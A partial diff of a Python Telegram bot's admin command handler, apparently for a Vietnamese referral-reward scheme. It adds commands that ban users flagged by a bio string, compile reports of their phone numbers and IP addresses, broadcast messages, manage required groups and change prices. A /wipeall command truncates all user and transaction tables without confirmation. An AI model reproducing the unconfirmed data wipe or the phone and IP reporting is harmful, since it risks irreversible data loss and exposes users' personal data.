+            ]
+
+            for ref_id, ref_by_id in banned_pairs:
+                await db_query(
+                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
+                    (ref_by_id,),
+                    commit=True,
+                )
+                await db_query(
+                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
+                    (ref_id,),
+                    commit=True,
+                )
+
+            for ref_id, referred_list in referrer_map.items():
+                ref_info = await db_query(
+                    "SELECT user_id, username, phone_number, ip_address FROM users WHERE user_id=%s",
+                    (ref_id,),
+                    fetchone=True,
+                )
+                ref_uname = (
+                    f"@{ref_info[1]}"
+                    if ref_info and ref_info[1]
+                    else f"User {ref_id}"
+                )
+                ref_phone = (
+                    ref_info[2] if ref_info and ref_info[2] else "Chưa có SĐT"
+                )
+                ref_ip = (
+                    ref_info[3]
+                    if ref_info and len(ref_info) > 3 and ref_info[3]
+                    else "Chưa có IP"
+                )
+
+                report_lines.append(
+                    f"{E['CROWN']} <b>Người Giới Thiệu:</b>\n• @name: {ref_uname} | ID: <code>{ref_id}</code>\n• SĐT: <code>{ref_phone}</code> | IP: <code>{ref_ip}</code>\n"
+                )
+                report_lines.append(
+                    "👥 <b>Người Được Giới Thiệu (Có tiểu sử @Lienminhvietnam):</b>"
+                )
+
+                for r_id in referred_list:
+                    r_info = await db_query(
+                        "SELECT user_id, username, phone_number, ip_address FROM users WHERE user_id=%s",
+                        (r_id,),
+                        fetchone=True,
+                    )
+                    r_uname = (
+                        f"@{r_info[1]}"
+                        if r_info and r_info[1]
+                        else f"User {r_id}"
+                    )
+                    r_phone = (
+                        r_info[2] if r_info and r_info[2] else "Chưa có SĐT"
+                    )
+                    r_ip = (
+                        r_info[3]
+                        if r_info and len(r_info) > 3 and r_info[3]
+                        else "Chưa có IP"
+                    )
+                    report_lines.append(
+                        f"• @name: {r_uname} | ID: <code>{r_id}</code> | SĐT: <code>{r_phone}</code> | IP: <code>{r_ip}</code>"
+                    )
+                report_lines.append("----------------------------------\n")
+
+            full_report = "\n".join(report_lines)
+            await send_split_message(
+                context.bot, chat_id, full_report, parse_mode="HTML"
+            )
+
+        elif cmd == "/banbuff":
+            await message.reply_text(
+                f"{E['HOURGLASS']} Đang quét hệ thống để khóa toàn bộ tài khoản buff tiểu sử `@Lienminhvietnam`...",
+                parse_mode="HTML",
+            )
+            all_users = await db_query(
+                "SELECT user_id, username, referrer_id FROM users WHERE is_banned=0",
+                fetchall=True,
+            )
+
+            banned_pairs = []
+            referrer_map = defaultdict(list)
+
+            for u_id, uname, ref_id in all_users:
+                try:
+                    chat_full = await context.bot.get_chat(u_id)
+                    bio = chat_full.bio or ""
+                    if BIO_FLAG in bio.lower():
+                        if ref_id:
+                            banned_pairs.append((ref_id, u_id))
+                            referrer_map[ref_id].append(u_id)
+                except Exception as e:
+                    logger.warning(f"Lỗi check bio user {u_id}: {e}")
+                await asyncio.sleep(0.05)
+
+            if not banned_pairs:
+                await message.reply_text(
+                    f"{E['CHECK']} Không tìm thấy tài khoản nào để khóa.",
+                    parse_mode="HTML",
+                )
+                return
+
+            report_lines = [
+                "🚨 <b>THÔNG BÁO KHÓA TOÀN BỘ TÀI KHOẢN BUFF</b>\n━━━━━━━━━━━━━━━━━━\n"
+            ]
+            for ref_id, ref_by_id in banned_pairs:
+                await db_query(
+                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
+                    (ref_by_id,),
+                    commit=True,
+                )
+                await db_query(
+                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
+                    (ref_id,),
+                    commit=True,
+                )
+
+            for ref_id, referred_list in referrer_map.items():
+                ref_info = await db_query(
+                    "SELECT user_id, username, phone_number, ip_address FROM users WHERE user_id=%s",
+                    (ref_id,),
+                    fetchone=True,
+                )
+                ref_uname = (
+                    f"@{ref_info[1]}"
+                    if ref_info and ref_info[1]
+                    else f"User {ref_id}"
+                )
+
+                report_lines.append(
+                    f"{E['CROWN']} <b>Người Giới Thiệu:</b>\n• @name: {ref_uname} | ID: <code>{ref_id}</code>\n"
+                )
+                report_lines.append(
+                    "👥 <b>Người Được Giới Thiệu:</b>"
+                )
+                for r_id in referred_list:
+                    r_info = await db_query(
+                        "SELECT user_id, username FROM users WHERE user_id=%s",
+                        (r_id,),
+                        fetchone=True,
+                    )
+                    r_uname = (
+                        f"@{r_info[1]}"
+                        if r_info and r_info[1]
+                        else f"User {r_id}"
+                    )
+                    report_lines.append(
+                        f"• @name: {r_uname} | ID: <code>{r_id}</code>"
+                    )
+                report_lines.append("----------------------------------\n")
+
+            full_report = "\n".join(report_lines)
+            await send_split_message(
+                context.bot, chat_id, full_report, parse_mode="HTML"
+            )
+
+        elif cmd == "/checkref":
             if not args:
-                await message.reply_text(f"Cú pháp: <code>/tb Nội dung thông báo</code>", parse_mode="HTML")
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/checkref USER_ID_HOẶC_USERNAME</code>",
+                    parse_mode="HTML",
+                )
+                return
+
+            target_query = args[0].replace("@", "")
+            if target_query.isdigit():
+                ref_user_row = await db_query(
+                    "SELECT user_id, username, phone_number, ip_address FROM users WHERE user_id=%s",
+                    (int(target_query),),
+                    fetchone=True,
+                )
+            else:
+                ref_user_row = await db_query(
+                    "SELECT user_id, username, phone_number, ip_address FROM users WHERE username ILIKE %s",
+                    (target_query,),
+                    fetchone=True,
+                )
+
+            if not ref_user_row:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy người giới thiệu trong cơ sở dữ liệu.",
+                    parse_mode="HTML",
+                )
+                return
+
+            ref_id, ref_uname_db, ref_phone, ref_ip = ref_user_row
+            ref_name_display = (
+                f"@{ref_uname_db}" if ref_uname_db else f"User {ref_id}"
+            )
+
+            invited_users = await db_query(
+                "SELECT user_id, username, phone_number, ip_address FROM users WHERE referrer_id=%s",
+                (ref_id,),
+                fetchall=True,
+            )
+            if not invited_users:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Người giới thiệu này chưa mời được thành viên nào.",
+                    parse_mode="HTML",
+                )
+                return
+
+            matched_referred = []
+            for u_id, u_uname, u_phone, u_ip in invited_users:
+                try:
+                    chat_full = await context.bot.get_chat(u_id)
+                    bio = chat_full.bio or ""
+                    if BIO_FLAG in bio.lower():
+                        matched_referred.append((u_id, u_uname, u_phone, u_ip))
+                except Exception as e:
+                    logger.warning(f"Lỗi check bio user {u_id}: {e}")
+                await asyncio.sleep(0.05)
+
+            if not matched_referred:
+                await message.reply_text(
+                    f"{E['CHECK']} Người giới thiệu này không có người được giới thiệu nào để tiểu sử `@Lienminhvietnam`.",
+                    parse_mode="HTML",
+                )
+                return
+
+            report_lines = [
+                "📊 <b>THỐNG KÊ CHECK THÀNH VIÊN GIỚI THIỆU</b>\n━━━━━━━━━━━━━━━━━━\n",
+                f"{E['CROWN']} <b>Người Giới Thiệu</b>\n• @name: {ref_name_display}\n• Full thông tin: ID `<code>{ref_id}</code>` | SĐT: `<code>{ref_phone or 'N/A'}</code>` | IP: `<code>{ref_ip or 'N/A'}</code>`\n",
+                "👥 <b>Người Được Giới Thiệu (Có tiểu sử @Lienminhvietnam):</b>",
+            ]
+
+            for r_id, r_uname, r_phone, r_ip in matched_referred:
+                r_name_display = f"@{r_uname}" if r_uname else f"User {r_id}"
+                report_lines.append(
+                    f"• @name: {r_name_display}\n  Full thông tin: ID `<code>{r_id}</code>` | SĐT: `<code>{r_phone or 'N/A'}</code>` | IP: `<code>{r_ip or 'N/A'}</code>`"
+                )
+
+            full_report = "\n".join(report_lines)
+            await send_split_message(
+                context.bot, chat_id, full_report, parse_mode="HTML"
+            )
+
+        elif cmd == "/broadcast":
+            if not args:
+                await message.reply_text(
+                    "Cú pháp: <code>/broadcast Nội dung thông báo</code>",
+                    parse_mode="HTML",
+                )
                 return
             content = " ".join(args).strip()
-            users = await db_query("SELECT user_id FROM users WHERE is_banned=0", fetchall=True)
-            groups = await db_query("SELECT chat_id FROM groups", fetchall=True)
+            users = await db_query(
+                "SELECT user_id FROM users WHERE is_banned=0", fetchall=True
+            )
+            groups = await db_query(
+                "SELECT chat_id FROM groups", fetchall=True
+            )
             count = 0
             for (target_id,) in users:
                 try:
-                    await context.bot.send_message(chat_id=target_id, text=f"{E['SPEAKER']} <b>THÔNG BÁO HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}", parse_mode="HTML")
+                    await context.bot.send_message(
+                        chat_id=target_id,
+                        text=f"{E['SPEAKER']} <b>THÔNG BÁO HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}",
+                        parse_mode="HTML",
+                    )
                     count += 1
-                except Exception: pass
-                await asyncio.sleep(0.02)
-            for (chat_id,) in groups:
+                except Exception:
+                    pass
+                await asyncio.sleep(0.05)
+            for (g_chat_id,) in groups:
                 try:
-                    await context.bot.send_message(chat_id=chat_id, text=f"{E['SPEAKER']} <b>THÔNG BÁO HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}", parse_mode="HTML")
+                    await context.bot.send_message(
+                        chat_id=g_chat_id,
+                        text=f"{E['SPEAKER']} <b>THÔNG BÁO HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}",
+                        parse_mode="HTML",
+                    )
                     count += 1
-                except Exception: pass
-                await asyncio.sleep(0.02)
-            await message.reply_text(f"{E['THUMB']} Đã phát thông báo tới <b>{count}</b> người dùng/nhóm.", parse_mode="HTML")
+                except Exception:
+                    pass
+                await asyncio.sleep(0.05)
+            await message.reply_text(
+                f"{E['CHECK2']} Đã phát thông báo tới <b>{count}</b> người dùng/nhóm.",
+                parse_mode="HTML",
+            )
 
-        elif cmd == "/bb":
-            if len(args) < 1:
-                await message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/bb USER_ID</code>", parse_mode="HTML")
+        elif cmd == "/sendmsg":
+            if len(args) < 2:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/sendmsg USER_ID Nội dung tin nhắn</code>",
+                    parse_mode="HTML",
+                )
                 return
-            try: target_id = int(args[0])
-            except (ValueError, TypeError):
-                await message.reply_text("❌ USER_ID không hợp lệ.")
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
                 return
-            invited_users = await db_query("SELECT user_id, username, joined_at, ref_rewarded, is_captcha_passed, is_phone_verified FROM users WHERE referrer_id=%s ORDER BY joined_at DESC", (target_id,), fetchall=True)
-            msg = f"{E['COOL']} <b>DANH SÁCH BẠN BÈ MỜI CỦA USER <code>{target_id}</code></b> (Tổng: <code>{len(invited_users)}</code> người):\n━━━━━━━━━━━━━━━━━━\n\n"
-            if invited_users:
-                for invited_id, username, joined_at, ref_rewarded, is_captcha_passed, is_phone_verified in invited_users:
-                    uname = f"@{username}" if username else "Chưa đặt username"
-                    status = "✅ Hợp lệ" if ref_rewarded == 1 else ("⏳ Chưa xác minh SĐT" if is_phone_verified == 0 else ("⏳ Chưa giải CAPTCHA" if is_captcha_passed == 0 else "⏳ Chưa hoàn tất"))
-                    msg += f"• ID: <code>{invited_id}</code> | Name: {uname} | {status}\n"
-            else:
-                msg += "❌ Người dùng này chưa mời được ai.\n"
-            await message.reply_text(msg, parse_mode="HTML")
+            content = " ".join(args[1:]).strip()
+            try:
+                await context.bot.send_message(
+                    chat_id=target_id,
+                    text=f"{E['SPEAKER']} <b>TIN NHẮN TỪ ADMIN</b>\n━━━━━━━━━━━━━━━━━━\n\n{content}",
+                    parse_mode="HTML",
+                )
+                await message.reply_text(
+                    f"{E['CHECK2']} Đã gửi tin nhắn tới <code>{target_id}</code>.",
+                    parse_mode="HTML",
+                )
+            except Exception as exc:
+                await message.reply_text(
+                    f"{E['CROSS']} Gửi thất bại: <code>{exc}</code>",
+                    parse_mode="HTML",
+                )
 
-        elif cmd == "/ban":
-            if len(args) < 1: return
-            target_id = int(args[0])
-            await db_query("UPDATE users SET is_banned=1 WHERE user_id=%s", (target_id,), commit=True)
-            user_withdraw_state.pop(target_id, None)
-            await message.reply_text(f"{E['BAN']} Đã cấm vĩnh viễn user <code>{target_id}</code>.", parse_mode="HTML")
-
-        elif cmd == "/unban":
-            if len(args) < 1: return
-            target_id = int(args[0])
-            await db_query("UPDATE users SET is_banned=0 WHERE user_id=%s", (target_id,), commit=True)
-            await message.reply_text(f"{E['THUMB']} <b>Đã mở ban tài khoản cho ID:</b> <code>{target_id}</code>", parse_mode="HTML")
-
-        elif cmd == "/cam":
-            if len(args) < 1: return
-            target_id = int(args[0])
-            await db_query("UPDATE users SET is_withdraw_banned=1 WHERE user_id=%s", (target_id,), commit=True)
-            user_withdraw_state.pop(target_id, None)
-            await message.reply_text(f"{E['STOP']} Đã cấm rút tiền ID <code>{target_id}</code>.", parse_mode="HTML")
-
-        elif cmd == "/un":
-            if len(args) < 1: return
-            target_id = int(args[0])
-            await db_query("UPDATE users SET is_withdraw_banned=0 WHERE user_id=%s", (target_id,), commit=True)
-            await message.reply_text(f"{E['THUMB']} <b>Đã mở cấm rút tiền cho ID:</b> <code>{target_id}</code>", parse_mode="HTML")
-
-        elif cmd in ("/nap", "/tru"):
-            if len(args) < 2: return
-            target_id, amount = int(args[0]), int(args[1])
-            if cmd == "/nap":
-                def add_money(cursor):
-                    cursor.execute("UPDATE users SET balance=balance+%s WHERE user_id=%s", (amount, target_id))
-                    cursor.execute("INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)", (target_id, "Nạp Tiền (Admin)", amount, "Thành công", get_now_str(), "Cộng từ Admin"))
-                    return True
-                await db_transaction(add_money)
-                await message.reply_text(f"{E['THUMB']} Đã cộng <b>+{amount:,}đ</b> cho ID <code>{target_id}</code>.", parse_mode="HTML")
-            else:
-                def deduct(cursor):
-                    cursor.execute("UPDATE users SET balance=balance-%s WHERE user_id=%s AND balance>=%s", (amount, target_id, amount))
-                    if cursor.rowcount != 1: return False
-                    cursor.execute("INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)", (target_id, "Trừ Tiền (Admin)", amount, "Thành công", get_now_str(), "Trừ từ Admin"))
-                    return True
-                if await db_transaction(deduct):
-                    await message.reply_text(f"{E['BAN']} Đã trừ <b>-{amount:,}đ</b> của ID <code>{target_id}</code>.", parse_mode="HTML")
-                else:
-                    await message.reply_text("❌ Số dư user không đủ để trừ.")
-
-        elif cmd == "/rut":
-            txs = await db_query("SELECT id, user_id, amount, details, created_at FROM transactions WHERE type='Rút Tiền' AND status='Chờ duyệt' ORDER BY id ASC", fetchall=True)
-            if not txs:
-                await message.reply_text(f"{E['LOVE']} Không có yêu cầu rút tiền nào đang chờ duyệt!")
-                return
-
-            await message.reply_text(f"{E['REFRESH']} Đang tải {len(txs)} lệnh rút tiền đang chờ duyệt...", parse_mode="HTML")
-
-            for tx_id, target_id, amount, details, created_at in txs:
-                btns = [[
-                    InlineKeyboardButton("✅ Duyệt", callback_data=f"approve_{tx_id}"),
-                    InlineKeyboardButton("❌ Từ chối", callback_data=f"reject_{tx_id}")
-                ]]
-                msg_text = f"{E['EYES']} <b>Lệnh:</b> #{tx_id}\n{E['COOL']} <b>User:</b> <code>{target_id}</code>\n{E['UP']} <b>Số tiền:</b> <code>{amount:,}đ</code>\n{E['LOCK']} <b>Bank:</b> <code>{details or 'N/A'}</code>"
-
-                qr_url = generate_vietqr_url(details, amount, memo="lixi trung thu") if details else ""
-                try:
-                    if qr_url:
-                        sent_msg = await message.reply_photo(photo=qr_url, caption=msg_text, reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")
-                    else:
-                        sent_msg = await message.reply_text(msg_text, reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")
-
-                    refs = context.bot_data.setdefault(f"tx_msgs_{tx_id}", [])
-                    refs.append({"chat_id": message.chat_id, "message_id": sent_msg.message_id, "base_text": msg_text, "has_photo": bool(qr_url)})
-                except Exception as exc:
-                    logger.error("Lỗi gửi ảnh QR lệnh rút #%s: %s", tx_id, exc)
-                    sent_msg = await message.reply_text(msg_text + f"\n\n⚠ <i>(Không tải được ảnh QR VietQR)</i>", reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")
-                    refs = context.bot_data.setdefault(f"tx_msgs_{tx_id}", [])
-                    refs.append({"chat_id": message.chat_id, "message_id": sent_msg.message_id, "base_text": msg_text, "has_photo": False})
-
-                await asyncio.sleep(0.15)
-
-        elif cmd == "/tc":
-            txs = await db_query("SELECT id, user_id, amount, created_at FROM transactions WHERE type='Rút Tiền' AND status='Thành công' ORDER BY id DESC", fetchall=True)
-            if not txs:
-                await message.reply_text("📜 Chưa có lệnh rút nào được duyệt.")
-                return
-
-            msg = f"{E['CHART']} <b>TẤT CẢ LỆNH RÚT ĐÃ DUYỆT THÀNH CÔNG:</b>\n\n"
-            for tx_id, target_id, amount, created_at in txs:
-                line = f"{E['THUMB']} #{tx_id} | <code>{target_id}</code> | <code>{amount:,}đ</code> | <code>{created_at}</code>\n"
-                if len(msg) + len(line) > 3800:
-                    await message.reply_text(msg, parse_mode="HTML")
-                    msg = ""
-                msg += line
-            if msg.strip():
-                await message.reply_text(msg, parse_mode="HTML")
-
-        elif cmd == "/gd":
-            if len(args) < 1: return
-            target_id = int(args[0])
-            txs = await db_query("SELECT type, amount, status, created_at FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 10", (target_id,), fetchall=True)
-            msg = f"{E['CHART']} <b>LỊCH SỬ GIAO DỊCH CỦA {target_id}:</b>\n"
-            if txs:
-                for tx_type, amount, status, created_at in txs:
-                    msg += f"• {tx_type}: <code>{amount:,}đ</code> [{status}] - <code>{created_at}</code>\n"
-            else:
-                msg += "• Chưa có giao dịch.\n"
-            await message.reply_text(msg, parse_mode="HTML")
-
-        elif cmd == "/baotri":
+        elif cmd == "/maint":
             curr = await is_maintenance()
-            await set_setting("maintenance", "0" if curr else "1")
-            await message.reply_text(f"{E['GEAR']} Trạng thái hệ thống: <b>{'TẮT BẢO TRÌ 🟢' if curr else 'BẮT ĐẦU BẢO TRÌ 🔴'}</b>", parse_mode="HTML")
+            new_val = "0" if curr else "1"
+            await db_query(
+                "UPDATE settings SET value=%s WHERE key='maintenance'",
+                (new_val,),
+                commit=True,
+            )
+            status_str = (
+                "BẮT ĐẦU BẢO TRÌ 🔴"
+                if new_val == "1"
+                else "TẮT BẢO TRÌ 🟢"
+            )
+            await message.reply_text(
+                f"{E['GEAR']} Trạng thái hệ thống: <b>{status_str}</b>",
+                parse_mode="HTML",
+            )
 
-        elif cmd == "/resetbank":
-            await reset_bank_command(update, context)
+        elif cmd == "/wipeall":
+            await db_query(
+                "TRUNCATE TABLE users, transactions, code_stock, code_deleted_log RESTART IDENTITY",
+                commit=True,
+            )
+            user_msg_tracker.clear()
+            temp_bans.clear()
+            user_withdraw_state.clear()
+            pending_captcha_users.clear()
+            pending_miniapp_captcha.clear()
+            pending_camera_verified.clear()
+            await db_query(
+                "INSERT INTO users (user_id, username, balance, joined_at) VALUES (%s, %s, 0, %s) ON CONFLICT (user_id) DO NOTHING",
+                (
+                    user_id,
+                    update.effective_user.username or "",
+                    get_now_str(),
+                ),
+                commit=True,
+            )
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ RESET TOÀN BỘ HỆ THỐNG!</b>\n"
+                f"• Toàn bộ người dùng, kho code & lịch sử giao dịch đã được xóa hoàn toàn.",
+                parse_mode="HTML",
+            )
 
-    except Exception as exc:
-        logger.exception("Lỗi admin command %s: %s", cmd, exc)
-        await message.reply_text("❌ Đã xảy ra lỗi khi xử lý lệnh.")
+        elif cmd == "/addgroup":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/addgroup @username</code>\n"
+                    f"Nhóm riêng tư: <code>/addgroup -100123456 https://t.me/+linkmoi</code>",
+                    parse_mode="HTML",
+                )
+                return
+            ref = _norm_chat_ref(args[0])
+            if not ref:
+                await message.reply_text(
+                    f"{E['CROSS']} Không nhận diện được nhóm. Hãy dùng <b>@username</b>, link công khai hoặc ID <code>-100...</code> "
+                    f"(link mời dạng <code>t.me/+xxx</code> không tự kiểm tra được).",
+                    parse_mode="HTML",
+                )
+                return
+            invite_url = next(
+                (a for a in args[1:] if a.startswith("http")), None
+            )
 
-# ============================================================
-# DISPATCHER
-# ============================================================
+            is_ad, status, chat = await check_bot_admin(context.bot, ref)
+            if chat is None:
+                await message.reply_text(
+                    f"{E['CROSS']} <b>Không truy cập được nhóm này!</b>\n"
+                    f"Hãy thêm bot vào nhóm và cấp quyền <b>admin</b> rồi thử lại.\n"
+                    f"<code>{_html.escape(status)}</code>",
+                    parse_mode="HTML",
+                )
+                return
+            if not is_ad:
+                await message.reply_text(
+                    f"{E['CROSS']} <b>BOT CHƯA LÀ ADMIN CỦA NHÓM NÀY!</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"Trạng thái hiện tại của bot: <code>{status}</code>\n"
+                    f"{E['RIGHT']} Hãy thêm bot làm <b>admin</b> rồi thêm lại nhóm.",
+                    parse_mode="HTML",
+                )
+                return
 
-async def text_message_dispatcher(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.effective_message or await handle_anti_spam(update, context):
+            store_ref = f"@{chat.username}" if chat.username else str(chat.id)
+            if not invite_url:
+                if chat.username:
+                    invite_url = f"https://t.me/{chat.username}"
+                else:
+                    await message.reply_text(
+                        f"{E['WARN']} Nhóm riêng tư cần kèm link mời:\n"
+                        f"<code>/addgroup {chat.id} https://t.me/+linkmoi</code>",
+                        parse_mode="HTML",
+                    )
+                    return
+            title = chat.title or store_ref
+
+            def add_channel(cursor):
+                cursor.execute(
+                    "INSERT INTO required_channels (chat_ref, title, invite_url, added_at) "
+                    "VALUES (%s,%s,%s,%s) ON CONFLICT (chat_ref) DO NOTHING",
+                    (store_ref, title, invite_url, get_now_str()),
+                )
+                return cursor.rowcount == 1
+
+            ok = await db_transaction(add_channel)
+            if not ok:
+                await message.reply_text(
+                    f"{E['WARN']} Nhóm <b>{_html.escape(title)}</b> đã có trong danh sách rồi.",
+                    parse_mode="HTML",
+                )
+                return
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ THÊM NHÓM YÊU CẦU THAM GIA!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['RIGHT']} Tên: <b>{_html.escape(title)}</b>\n"
+                f"{E['TARGET']} Định danh: <code>{store_ref}</code>\n"
+                f"{E['SHIELD']} Bot là admin: <b>CÓ</b>",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/delgroup":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/delgroup ID_SỐ_hoặc_@username</code>",
+                    parse_mode="HTML",
+                )
+                return
+            key = args[0]
+
+            def del_channel(cursor):
+                if key.isdigit() and len(key) < 6:
+                    cursor.execute(
+                        "DELETE FROM required_channels WHERE id=%s RETURNING chat_ref, title",
+                        (int(key),),
+                    )
+                else:
+                    ref = _norm_chat_ref(key)
+                    if not ref:
+                        return None
+                    cursor.execute(
+                        "DELETE FROM required_channels WHERE lower(chat_ref)=lower(%s) RETURNING chat_ref, title",
+                        (ref,),
+                    )
+                return cursor.fetchone()
+
+            row = await db_transaction(del_channel)
+            if not row:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy nhóm này trong danh sách.",
+                    parse_mode="HTML",
+                )
+                return
+            await message.reply_text(
+                f"{E['CHECK2']} Đã xóa nhóm yêu cầu: <b>{_html.escape(row[1] or row[0])}</b> (<code>{row[0]}</code>)",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/listgroup":
+            rows = await get_required_channels()
+            if not rows:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Chưa có nhóm nào bắt buộc tham gia.",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['TOP']} <b>NHÓM ĐANG YÊU CẦU THAM GIA</b> (<b>{len(rows)}</b>)\n━━━━━━━━━━━━━━━━━━\n"
+            for rid, ref, title, url in rows:
+                msg += (
+                    f"• ID: <code>{rid}</code> | <b>{_html.escape(title or ref)}</b>\n"
+                    f"   <code>{ref}</code> | {_html.escape(url or 'không có link')}\n"
+                )
+            msg += f"\n{E['INFO']} Xóa: <code>/delgroup ID</code>"
+            await send_split_message(
+                context.bot, chat_id, msg, parse_mode="HTML"
+            )
+
+        elif cmd == "/checkgroup":
+            rows = await get_required_channels()
+            if not rows:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Chưa có nhóm nào để kiểm tra.",
+                    parse_mode="HTML",
+                )
+                return
+            await message.reply_text(
+                f"{E['HOURGLASS']} Đang kiểm tra quyền admin của bot ở {len(rows)} nhóm...",
+                parse_mode="HTML",
+            )
+            results = await asyncio.gather(
+                *[check_bot_admin(context.bot, r[1]) for r in rows]
+            )
+            ok_cnt = sum(1 for r in results if r[0])
+            msg = (
+                f"{E['SHIELD']} <b>KẾT QUẢ KIỂM TRA ADMIN</b>\n━━━━━━━━━━━━━━━━━━\n"
+                f"{E['CHECK2']} Bot là admin: <b>{ok_cnt}</b> | {E['CROSS']} Chưa/Lỗi: <b>{len(rows) - ok_cnt}</b>\n\n"
+            )
+            for (rid, ref, title, url), (is_ad, status, _c) in zip(
+                rows, results
+            ):
+                icon = E["CHECK2"] if is_ad else E["CROSS"]
+                msg += f"{icon} ID <code>{rid}</code> | <b>{_html.escape(title or ref)}</b> — <code>{_html.escape(str(status))[:60]}</code>\n"
+            if ok_cnt < len(rows):
+                msg += (
+                    f"\n{E['WARN']} Nhóm chưa có quyền admin sẽ khiến mọi user bị báo \"chưa tham gia\". "
+                    f"Hãy cấp admin cho bot hoặc xóa nhóm bằng <code>/delgroup</code>."
+                )
+            await send_split_message(
+                context.bot, chat_id, msg, parse_mode="HTML"
+            )
+
+        elif cmd == "/checkadmin":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/checkadmin @username</code>",
+                    parse_mode="HTML",
+                )
+                return
+            ref = _norm_chat_ref(args[0])
+            if not ref:
+                await message.reply_text(
+                    f"{E['CROSS']} Nhóm không hợp lệ.", parse_mode="HTML"
+                )
+                return
+            is_ad, status, chat = await check_bot_admin(context.bot, ref)
+            name = _html.escape(chat.title) if chat and chat.title else ref
+            if is_ad:
+                await message.reply_text(
+                    f"{E['CHECK2']} Bot <b>ĐÃ LÀ ADMIN</b> ở nhóm <b>{name}</b> ({status}).",
+                    parse_mode="HTML",
+                )
+            else:
+                await message.reply_text(
+                    f"{E['CROSS']} Bot <b>CHƯA LÀ ADMIN</b> ở nhóm <b>{name}</b>.\n"
+                    f"Trạng thái: <code>{_html.escape(str(status))[:80]}</code>",
+                    parse_mode="HTML",
+                )
+
+        elif cmd == "/clearallgroup":
+
+            def clear_channels(cursor):
+                cursor.execute("DELETE FROM required_channels")
+                return cursor.rowcount
+
+            n_del = await db_transaction(clear_channels)
+            CHANNEL_URLS.clear()
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ XÓA TẤT CẢ NHÓM YÊU CẦU THAM GIA!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"• Đã xóa: <b>{n_del:,}</b> nhóm/kênh.\n"
+                f"{E['INFO']} Thêm nhóm mới bằng <code>/addgroup</code>.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/price":
+            await message.reply_text(
+                f"{E['MONEY']} <b>Giá code hiện tại:</b> <code>{CODE_PRICE:,}đ</code>\n"
+                f"{E['INFO']} Đổi giá: <code>/setprice</code> · <code>/upprice</code> · <code>/downprice</code>",
+                parse_mode="HTML",
+            )
+
+        elif cmd in ("/setprice", "/upprice", "/downprice"):
+            val = _parse_money(args[0]) if args else None
+            if val is None:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>{cmd} SỐ_TIỀN</code> (số nguyên lớn hơn 0)",
+                    parse_mode="HTML",
+                )
+                return
+            old_price = CODE_PRICE
+            if cmd == "/setprice":
+                new_price = val
+            elif cmd == "/upprice":
+                new_price = old_price + val
+            else:
+                new_price = old_price - val
+            if new_price <= 0:
+                await message.reply_text(
+                    f"{E['CROSS']} Giá sau khi giảm phải lớn hơn 0 (hiện tại {old_price:,}đ).",
+                    parse_mode="HTML",
+                )
+                return
+            await save_code_price(new_price)
+            arrow = (
+                E["UP"]
+                if new_price > old_price
+                else (E["DOWN"] if new_price < old_price else E["RIGHT"])
+            )
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ CẬP NHẬT GIÁ CODE!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['MONEY']} Giá cũ: <code>{old_price:,}đ</code>\n"
+                f"{arrow} Giá mới: <b><code>{new_price:,}đ</code></b>\n\n"
+                f"{E['INFO']} Mọi thông báo giá (menu Rút Code, Mời Bạn Bè, nút mua, đơn chờ duyệt) đã tự cập nhật. "
+                f"Muốn báo user thì dùng <code>/broadcast</code>.",
+                parse_mode="HTML",
+            )
+
+    except Exception as ecx:
+        logger.exception("Lỗi admin command %s: %s", cmd, ecx)
+        await message.reply_text(
+            f"{E['CROSS']} Đã xảy ra lỗi khi xử lý lệnh.", parse_mode="HTML"
+        )
+
+
+MENU_BUTTON_TEXTS = (
+    "Tài Khoản",
+    "Mời Bạn Bè",
+    "Rút Code",
+    "Top",
+    "Nhóm Hỗ Trợ",
+    "Lịch Sử Giao Dịch",
+    "Link Game",
+    "Menu",
+)
+
+
+async def text_message_dispatcher(
